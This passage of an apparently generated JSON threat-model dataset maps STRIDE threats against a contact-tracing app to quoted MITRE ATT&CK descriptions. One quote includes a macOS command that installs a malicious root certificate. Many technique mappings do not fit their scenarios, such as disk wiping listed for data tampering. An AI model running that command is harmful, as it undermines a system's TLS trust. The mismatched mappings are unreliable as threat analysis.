                "description": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002) without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) \n\nAn adversary may also add a new federated identity provider to an identity tenant such as Okta, which may enable the adversary to authenticate as any user of the tenant.(Citation: Okta Cross-Tenant Impersonation 2023)",
                "id": "attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee",
                "technique_id": "T1484.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the app to access and extract users' contact and health status data.",
            "Assumptions": [],
            "Potential Impact": "Unauthorized disclosure of personal and health information, potential for identity theft or privacy invasion.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data extraction",
                "vulnerability exploitation",
                "privacy invasion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A malicious insider accesses the server storing user data and copies sensitive information.",
            "Assumptions": [],
            "Potential Impact": "Insider threat leading to data breaches, unauthorized disclosure of private health information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider threat",
                "data breach",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "Remote Email Collection",
                "description": "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.",
                "id": "attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a",
                "technique_id": "T1114.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted Bluetooth communication between user devices, accessing exchanged IDs and proximity data.",
            "Assumptions": [],
            "Potential Impact": "Unauthorized access to user proximity data, potential for tracking user's movements over time.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unencrypted communication",
                "Bluetooth",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the central server with bogus data, overwhelming it and causing legitimate users to experience service disruptions.",
            "Assumptions": [],
            "Potential Impact": "Disruption of service, making it unavailable for users and hindering the contact tracing effort.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "server flooding",
                "availability",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker uses a Bluetooth flooding attack to disrupt the normal operation of the contact tracing app on user devices.",
            "Assumptions": [],
            "Potential Impact": "Disruption of app functionality, preventing accurate recording of proximity data.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "Bluetooth flooding",
                "app disruption",
                "proximity data"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the network connectivity between the user devices and the central server, causing intermittent unavailability of the service.",
            "Assumptions": [],
            "Potential Impact": "Intermittent service failures and delays, impacting the timeliness of exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network attack",
                "service unavailability",
                "communication disruption"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the app to gain administrative access on user devices.",
            "Assumptions": [],
            "Potential Impact": "Unauthorized control over device, potential to tamper with or extract sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "device control",
                "vulnerability exploitation",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains elevated permissions on the central server, allowing them to manipulate critical data.",
            "Assumptions": [],
            "Potential Impact": "Corruption of sensitive health data, ability to initiate false exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "server access",
                "data manipulation",
                "false notifications"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a software bug to grant themselves higher privileges within the application, bypassing regular user restrictions.",
            "Assumptions": [],
            "Potential Impact": "Unauthorized access and control within the app, potential for widespread data manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "software bug",
                "bypass restrictions",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "16",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a legitimate user's device ID to manipulate the contact tracing data.",
            "Assumptions": [
                {
                    "Assumption": "An attacker has the capability to intercept and analyze Bluetooth transmissions.",
                    "Role": "Attacker",
                    "Condition": "Attack executes within proximity of the target device."
                },
                {
                    "Assumption": "The application does not use secure methods to verify the authenticity of device IDs.",
                    "Role": "Application Developer",
                    "Condition": "System design flaw."
                },
                {
                    "Assumption": "Bluetooth communication is susceptible to eavesdropping and spoofing.",
                    "Role": "Data Transmission Protocols",
                    "Condition": "Unsecured Bluetooth communications."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of user interactions, disruption in contact tracing accuracy.",
            "MITRE ATT&CK Keywords": [
                "device ID spoofing",
                "Bluetooth",
                "network",
                "eavesdropping"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary could spoof a COVID-19 positive status to cause widespread panic.",
            "Assumptions": [
                {
                    "Assumption": "The system accepts user-reported health statuses without verification.",
                    "Role": "Application Developer",
                    "Condition": "No validation of health reports."
                },
                {
                    "Assumption": "The attacker can manipulate data sent to the server.",
                    "Role": "Attacker",
                    "Condition": "Access to network or compromised device."
                },
                {
                    "Assumption": "There's a lack of secure channels for sensitive data transmission.",
                    "Role": "System Architect",
                    "Condition": "Unsecured data submission."
                }
            ],
            "Potential Impact": "Unauthorized disclosure and false alerts compromising the system's integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "public alert",
                "panic",
                "network manipulation"
            ],
            "mitre_technique": {
                "name": "Phishing",
                "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",
                "id": "attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b",
                "technique_id": "T1566"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious user could impersonate the central server to collect sensitive user data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can perform a man-in-the-middle attack.",
                    "Role": "Attacker",
                    "Condition": "Within network range and uses vulnerability."
                },
                {
                    "Assumption": "Server authentication mechanisms are weak or exploitable.",
                    "Role": "System Administrator",
                    "Condition": "Poorly implemented security protocols."
                },
                {
                    "Assumption": "Users' devices do not validate the identity of the server properly.",
                    "Role": "User Device",
                    "Condition": "Lack of security validation."
                }
            ],
            "Potential Impact": "Unauthorized data collection, potential privacy breaches, integrity loss of contact data.",
            "MITRE ATT&CK Keywords": [
                "identity spoofing",
                "man-in-the-middle",
                "data collection",
                "server impersonation"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could alter the temporary IDs exchanged to cause false contact tracing records.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the communication channel between devices.",
                    "Role": "Attacker",
                    "Condition": "Proximity and access to Bluetooth communications."
                },
                {
                    "Assumption": "The system does not employ end-to-end encryption for ID exchanges.",
                    "Role": "Application Developer",
                    "Condition": "Lack of encryption."
                },
                {
                    "Assumption": "Temporary IDs can be intercepted and modified without detection.",
                    "Role": "System Analyst",
                    "Condition": "Inadequate data integrity checks."
                }
            ],
            "Potential Impact": "False data corruption, unreliable contact tracing results, privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data corruption",
                "Bluetooth",
                "ID modification"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware on a user's device could tamper with proximity data before it is transmitted.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack strong mobile malware protection.",
                    "Role": "End User",
                    "Condition": "Unprotected or outdated antivirus measures."
                },
                {
                    "Assumption": "The application does not verify the integrity of proximity data pre-transmission.",
                    "Role": "Application Developer",
                    "Condition": "Absence of data validation steps."
                },
                {
                    "Assumption": "The attacker can install malicious apps on the user's device.",
                    "Role": "Attacker",
                    "Condition": "Social engineering or existing vulnerabilities."
                }
            ],
            "Potential Impact": "Corruption and manipulation of data before reaching the server, affecting system integrity.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "tampering",
                "mobile device",
                "proximity data"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider could modify log files stored on the server to alter contact tracing records.",
            "Assumptions": [
                {
                    "Assumption": "The insider has access privileges to modify log files.",
                    "Role": "Insider Threat",
                    "Condition": "Granted elevated access or compromised admin credentials."
                },
                {
                    "Assumption": "Log files are not protected with stringent access controls.",
                    "Role": "System Administrator",
                    "Condition": "Weak access control policies."
                },
                {
                    "Assumption": "Changes to log files are not tracked or audited.",
                    "Role": "Security Officer",
                    "Condition": "Lack of logging and monitoring."
                }
            ],
            "Potential Impact": "Loss of data integrity, unreliable logs for forensic analysis, compromised system trust.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "log tampering",
                "server",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user could deny having reported a positive COVID-19 status due to lack of audit trails.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log user actions securely.",
                    "Role": "Application Developer",
                    "Condition": "Absence of secure logging mechanisms."
                },
                {
                    "Assumption": "Users have the capability to alter or delete log entries locally.",
                    "Role": "End User",
                    "Condition": "Insufficient local security protections."
                },
                {
                    "Assumption": "The system lacks mechanisms to verify the integrity of actions performed by users.",
                    "Role": "Security Administrator",
                    "Condition": "Lack of integrity verification."
                }
            ],
            "Potential Impact": "Difficulty in proving user actions, data integrity issues, compromised accountability.",
            "MITRE ATT&CK Keywords": [
                "audit log",
                "repudiation",
                "data integrity",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could tamper with communication logs to deny sending or receiving critical data.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored in a location accessible to unauthorized individuals.",
                    "Role": "System Administrator",
                    "Condition": "Poor storage location."
                },
                {
                    "Assumption": "Log data is not protected against tampering.",
                    "Role": "Application Developer",
                    "Condition": "Inadequate data protection techniques."
                },
                {
                    "Assumption": "The system does not verify and validate log data periodically.",
                    "Role": "Security Officer",
                    "Condition": "No periodic log review process."
                }
            ],
            "Potential Impact": "Loss of log integrity, inability to track user actions correctly, potential cover-up of malicious activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "communication logs",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious insider could alter stored data records to cover unauthorized changes.",
            "Assumptions": [
                {
                    "Assumption": "The insider has the necessary access rights to the stored data records.",
                    "Role": "Insider Threat",
                    "Condition": "Privileged access level."
                },
                {
                    "Assumption": "Data records are not adequately protected against modification.",
                    "Role": "Application Developer",
                    "Condition": "Lack of stringent access control mechanisms."
                },
                {
                    "Assumption": "There are no audit logs tracking changes to data records.",
                    "Role": "Security Officer",
                    "Condition": "Inadequate logging practices."
                }
            ],
            "Potential Impact": "Compromised data integrity, difficulty in forensic investigations, failure to maintain accurate records.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "data modification",
                "repudiation",
                "record tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unencrypted transmission of contact tracing data could be intercepted by an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted over unsecured channels.",
                    "Role": "Application Developer",
                    "Condition": "Lack of encryption."
                },
                {
                    "Assumption": "The attacker has the capability to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Within range of data transmission."
                },
                {
                    "Assumption": "Users are unaware of the need for secure networks.",
                    "Role": "End User",
                    "Condition": "Lack of security awareness."
                }
            ],
            "Potential Impact": "Exposure of sensitive contact data, loss of confidentiality.",
            "MITRE ATT&CK Keywords": [
                "unencrypted transmission",
                "data interception",
                "network traffic",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
